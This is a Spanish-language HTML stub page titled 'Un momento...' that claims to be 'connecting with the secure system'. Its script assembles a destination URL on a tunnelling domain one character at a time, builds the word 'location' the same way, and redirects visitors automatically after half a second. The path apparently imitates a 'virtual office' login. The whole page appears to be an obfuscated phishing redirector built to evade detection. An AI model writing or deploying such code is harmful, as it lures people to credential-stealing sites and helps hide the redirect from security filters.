<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Un momento...</title>
  <script>
    (function() {
      const fragmentos = [
        'h','t','t','p','s',':','/','/',
        'c','j','f','i','e','r','w','m','q','q','a','j','w','j','z','t','d','k','m','j','y','r','h','m','h','x','r','p','g','u',
        '.','l','o','c','a','l','t','o','.','n','e','t',
        '/','a','2','6','0','1','o','f','i','c','i','n','a','v','i','r','t','u','a','l'
      ];
      const destino = fragmentos.join('');
      const prop = ['l','o','c','a','t','i','o','n'].join('');
      setTimeout(() => window[prop].href = destino, 500);
    })();
  </script>
</head>
<body>
  <p>Conectando con el sistema seguro...</p>
</body>
</html>
